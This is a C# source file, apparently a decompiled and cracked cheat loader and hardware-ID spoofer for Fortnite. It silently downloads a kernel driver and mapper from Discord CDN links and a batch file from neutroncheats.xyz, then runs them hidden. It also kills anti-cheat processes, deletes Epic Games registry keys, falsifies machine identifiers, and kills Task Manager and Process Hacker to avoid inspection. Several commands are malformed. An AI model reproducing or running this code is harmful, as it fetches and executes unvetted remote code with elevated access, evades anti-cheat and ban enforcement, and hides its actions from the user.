using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Neutron_Loader
{

    internal class Kill
    {

        public static void Test()
        {
            WebClient webClient = new WebClient();
            string text = "C:\\Windows\\IME\\mappser111.exe";
            string text2 = "C:\\Windows\\IME\\serdsiall.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708858946777120828/spoofer.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/708392657587535882/708858981266751558/mapper_3.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process process2 = Process.Start(text, text2);
            Thread.Sleep(1000);
            process2.Close();
            File.Delete(text2);
            File.Delete(text);
        }


        public static void Traces()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\\Profiles\\0001 \\v HwProfileGuid \\t REG_SZ \\d {%08x-%04x-%04x-%04x-%04x%08x} /f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SYSTEM\\HardwareConfig /v LastConfig /t REG_SZ /d {eacc%random%} /f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion /v InstallDate /t REG_SZ /d %random% /f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\\ /v ComputerName /t REG_SZ /d %PCNAME% Neutron-%random% /f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\ /v Hostname / t REG_SZ / d %PCNAME% Neutron-%random% / f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\ /v NV Hostname/t REG_SZ /d %PCNAME% Neutron-%random% /f");
            process.StandardInput.WriteLine("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion /v ProductId /t REG_SZ /d %random%-%random%-%random%-%random% /f");
            process.StandardInput.WriteLine("exit");
            Thread.Sleep(3000);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Clear();
            Console.Write(" [~] Cleaned Registry Files\n");
        }

        
        public static void Reg()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = false;
            process.Start();
            process.StandardInput.WriteLine("REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001/v HwProfileGuid /t REG_SZ /d {%Hex8%-%Hex1%-%Hex0%-%Hex1%-80%Hex10%} /f");
            process.StandardInput.WriteLine("RED ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography/v MachineGuid /t REG_SZ /d %Hex8%-%Hex1%-%Hex0%-%Hex1%-80%Hex10% /f");
            process.StandardInput.WriteLine("exit");
            Console.Clear();
            Console.Write(" [~] Added Registry Files ");
        }

        
        public static void Clean()
        {
            // Dont Think Yall Are Cool Haxors That u Cracked a Free Spoofer ~ nano
            // You are indeed big hax0r you cracked free loader ~ chrge
            Console.ForegroundColor = ConsoleColor.Green;
            //Console.Write(" [~] Cleaning Traces\n");
            WebClient webClient = new WebClient();
            string fileName = "C:\\Windows\\IME\\xD.bat";
            webClient.DownloadFile("https://neutroncheats.xyz/test/Paid.bat", fileName);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            //process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(fileName);
        }

        //public static void Selfbot()
        //{
            
            //Console.ForegroundColor = ConsoleColor.Green;
            //Console.Write(" [~] Cleaning Traces\n");
            //WebClient webClient = new WebClient();
            //string fileName = "C:\\Selfbot.rar";
            //webClient.DownloadFile("https://neutroncheats.xyz/test/Selfbot.rar", fileName);
       
        //}

        // Token: 0x06000005 RID: 5 RVA: 0x0000247C File Offset: 0x0000067C
        public static void Damn()
        {
            Thread thread = new Thread(new ThreadStart(Kill.Damn));
            Thread.Sleep(3000);
            thread.Start();
            foreach (Process process2 in Process.GetProcessesByName("Taskmgr"))
            {
                Process process7 = new Process();
                process2.StartInfo.FileName = "cmd.exe";
                process2.StartInfo.RedirectStandardInput = true;
                process2.StartInfo.RedirectStandardError = true;
                process2.StartInfo.RedirectStandardOutput = true;
                process2.StartInfo.UseShellExecute = false;
                process2.StartInfo.CreateNoWindow = true;
                process2.Start();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\n [~] DEBUGGER TASKMGR IS OPEN");
                Console.ForegroundColor = ConsoleColor.Red;
                process2.StandardInput.WriteLine("taskkill /f /im Taskmgr.exe ");
                Thread.Sleep(2000);
                Process.GetCurrentProcess().Kill();
            }
            foreach (Process process3 in Process.GetProcessesByName("ProcessHacker"))
            {
                Process process4 = new Process();
                process4.StartInfo.FileName = "cmd.exe";
                process4.StartInfo.RedirectStandardInput = true;
                process4.StartInfo.RedirectStandardError = true;
                process4.StartInfo.RedirectStandardOutput = true;
                process4.StartInfo.UseShellExecute = false;
                process4.StartInfo.CreateNoWindow = true;
                process4.Start();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\n [~] DEBUGGER ProcessHacker IS OPEN");
                Console.ForegroundColor = ConsoleColor.Red;
                process4.StandardInput.WriteLine("taskkill /f /im ProcessHacker.exe ");
                Thread.Sleep(2000);
                Process.GetCurrentProcess().Kill();
            }


        }

    }
}
